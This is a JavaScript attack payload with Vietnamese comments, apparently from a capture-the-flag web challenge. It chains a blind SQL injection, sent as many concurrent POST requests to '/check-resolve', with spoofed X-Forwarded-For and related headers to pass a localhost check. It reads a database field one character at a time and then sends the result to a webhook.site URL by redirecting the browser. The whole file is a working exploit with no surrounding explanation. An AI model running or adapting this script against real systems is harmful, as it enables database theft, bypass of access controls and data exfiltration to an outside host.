(async function() {
    let flag = "";
    // Tập hợp các ký tự có thể xuất hiện trong cờ
    let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!?@";
    
    // Quét tối đa 40 ký tự của cờ
    for (let pos = 1; pos <= 40; pos++) {
        let foundChar = null;
        
        // Bắn CÙNG LÚC 65 câu hỏi cho server (rất nhanh vì chạy trên localhost)
        let requests = charset.split('').map(async (char) => {
            let ascii = char.charCodeAt(0);
            let formData = new URLSearchParams();
            
            // Câu hỏi: Ký tự thứ [pos] của cột content có mã ASCII là [ascii] đúng không?
            formData.append('id', `6 AND substr((SELECT content FROM cases WHERE id=6), ${pos}, 1) = char(${ascii})`);
            
            try {
                let res = await fetch('/check-resolve', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '127.0.0.1',
                        'Client-IP': '127.0.0.1'
                    },
                    body: formData.toString()
                });
                
                let data = await res.text();
                // Nếu đúng, server trả về "Not yet". Nếu sai, server trả về "[]"
                if (data.includes('Not yet')) {
                    return char;
                }
            } catch(e) {}
            return null;
        });
        
        // Chờ xem có câu hỏi nào trúng đích không
        let results = await Promise.all(requests);
        for (let c of results) {
            if (c !== null) {
                foundChar = c;
                break;
            }
        }
        
        // Nếu tìm thấy chữ cái, ghép vào cờ
        if (foundChar) {
            flag += foundChar;
            // Nếu gặp dấu ngoặc nhọn đóng (kết thúc cờ), dừng lại luôn để tiết kiệm thời gian
            if (foundChar === '}') break; 
        } else {
            // Nếu quét hết bảng chữ cái không thấy, tức là đã hết chuỗi
            break; 
        }
    }
    
    // KẾT THÚC: Ép Bot mang toàn bộ lá cờ vừa ghép được bay về Beeceptor!
    window.location = 'https://webhook.site/2fc3e3e9-24dd-4048-91c9-b5cc45619d1d/?THE_FLAG_IS=' + encodeURIComponent(flag);
})();